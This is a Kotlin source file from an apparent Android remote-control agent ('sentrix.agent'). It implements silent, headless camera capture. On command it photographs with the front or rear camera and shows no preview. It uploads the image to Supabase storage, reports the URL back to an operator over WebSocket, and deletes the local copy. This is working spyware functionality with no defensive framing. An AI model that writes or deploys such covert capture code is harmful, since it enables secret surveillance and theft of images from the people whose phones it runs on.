package com.sentrix.agent.commands

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.sentrix.agent.network.Uploader
import com.sentrix.agent.network.WebSocketClient
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeout
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import kotlin.coroutines.resume

/**
 * Silent camera capture using Camera2 API.
 * Works without root — no preview surface required (headless capture).
 *
 * Takes a photo from front or rear camera, saves to internal cache,
 * uploads to Supabase, then sends the URL back via WebSocket.
 */
object CameraCommands {

    private const val TAG = "CameraCmds"
    private const val CAPTURE_TIMEOUT_MS = 15_000L  // 15 second timeout per capture

    @SuppressLint("MissingPermission")
    suspend fun capture(
        context: Context,
        useFront: Boolean,
        wsClient: WebSocketClient
    ): String {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        // Find the right camera
        val cameraId = findCamera(cameraManager, useFront)
            ?: return "Camera not found"

        val outputFile = File(context.cacheDir, "capture_${System.currentTimeMillis()}.jpg")

        return try {
            withTimeout(CAPTURE_TIMEOUT_MS) {
                captureImage(context, cameraManager, cameraId, outputFile)
            }

            // Upload and report back
            val url = Uploader.upload(outputFile, "image/jpeg")
            val result = Uploader.resultJson(
                if (useFront) "front_cam" else "rear_cam",
                url
            )
            wsClient.send(result)
            outputFile.delete()

            if (url != null) "Photo captured and uploaded" else "Photo captured (upload failed)"
        } catch (e: Exception) {
            Log.e(TAG, "Capture failed: ${e.message}")
            "Camera capture failed: ${e.message}"
        }
    }

    private fun findCamera(manager: CameraManager, front: Boolean): String? {
        val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT
                     else       CameraCharacteristics.LENS_FACING_BACK
        return manager.cameraIdList.firstOrNull { id ->
            manager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == facing
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun captureImage(
        context: Context,
        manager: CameraManager,
        cameraId: String,
        output: File
    ) = suspendCancellableCoroutine<Unit> { cont ->

        val thread  = HandlerThread("CameraCapture").also { it.start() }
        val handler = Handler(thread.looper)

        val characteristics = manager.getCameraCharacteristics(cameraId)
        val sizes = characteristics
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            .getOutputSizes(ImageFormat.JPEG)

        // Pick a reasonable resolution — not max (faster), not min (too low quality)
        val size = sizes.sortedByDescending { it.width * it.height }
            .getOrElse(sizes.size / 2) { sizes.first() }

        val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)

        imageReader.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            val bytes  = ByteArray(buffer.remaining())
            buffer.get(bytes)
            image.close()

            FileOutputStream(output).use { it.write(bytes) }
            Log.i(TAG, "Image saved: ${output.absolutePath} (${bytes.size} bytes)")

            imageReader.close()
            thread.quit()
            if (cont.isActive) cont.resume(Unit)
        }, handler)

        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                val surface = imageReader.surface
                camera.createCaptureSession(
                    listOf(surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            val captureRequest = camera.createCaptureRequest(
                                CameraDevice.TEMPLATE_STILL_CAPTURE
                            ).apply {
                                addTarget(surface)
                                set(CaptureRequest.CONTROL_AF_MODE,
                                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                set(CaptureRequest.CONTROL_AE_MODE,
                                    CaptureRequest.CONTROL_AE_MODE_ON)
                            }.build()

                            session.capture(captureRequest, object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureFailed(s: CameraCaptureSession, r: CaptureRequest, failure: CaptureFailure) {
                                    camera.close()
                                    thread.quit()
                                    if (cont.isActive) cont.resume(Unit)
                                }
                            }, handler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            camera.close()
                            thread.quit()
                            if (cont.isActive) cont.resume(Unit)
                        }
                    }, handler
                )
            }
            override fun onDisconnected(camera: CameraDevice) { camera.close(); thread.quit() }
            override fun onError(camera: CameraDevice, error: Int) {
                camera.close(); thread.quit()
                Log.e(TAG, "Camera error: $error")
                if (cont.isActive) cont.resume(Unit)
            }
        }, handler)
    }
}
